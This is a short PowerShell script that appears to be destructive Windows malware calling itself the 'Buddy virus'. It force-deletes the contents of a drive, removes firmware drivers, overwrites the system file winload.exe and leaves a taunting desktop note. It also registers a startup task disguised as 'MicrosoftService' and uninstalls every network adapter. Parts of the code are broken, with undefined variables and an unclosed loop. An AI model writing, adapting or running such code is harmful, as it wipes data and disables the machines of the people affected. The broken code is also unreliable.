# BOOTLOADER FILE
$scriptPath = Join-Path -Path $PSScriptRoot -ChildPath "kick.vbs"

# BOOTLOADER
$adaptadoresDeRede = Get-NetAdapter | Where-Object { $_.PhysicalMediaType -ne "Loopback" }
$drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 -and $_.DeviceID -ne "C:" }
$fileName = "cab.ps1"
$sourceFile = Join-Path -Path $PSScriptRoot -ChildPath $fileName
$destinationFile = " \Windows\system32\winload.exe"
$driveLetter = $drive.DeviceID
Remove-Item -Path "$driveLetter\*" -Recurse -Force
$drivers = pnputil.exe /enum-drivers
$driversDeFirmware = $drivers | Where-Object { $_ -like "*Firmware*" }
foreach ($driver in $driversDeFirmware) {
    pnputil.exe /delete-driver $driver
    Set-Content -Path "$([System.Environment]::GetFolderPath('Desktop'))\Buddy2you.txt" -Value "Your computer has been messed up by the Buddy virus :). Don't try to turn it off or restart it; the bootloader and some essential programs for your Windows have been infected, including a part of your MBR!"

$conteudo | Set-Content -Path $caminhoArquivo -Force

Copy-Item -Path $sourceFile -Destination $destinationFile -Force


$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument $scriptPath
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftService"
foreach ($adaptador in $adaptadoresDeRede) {
    Uninstall-NetAdapter -Name $adaptador.Name -Confirm:$false -Force
}

while ($true) {
    Start-Sleep -Seconds 1
}

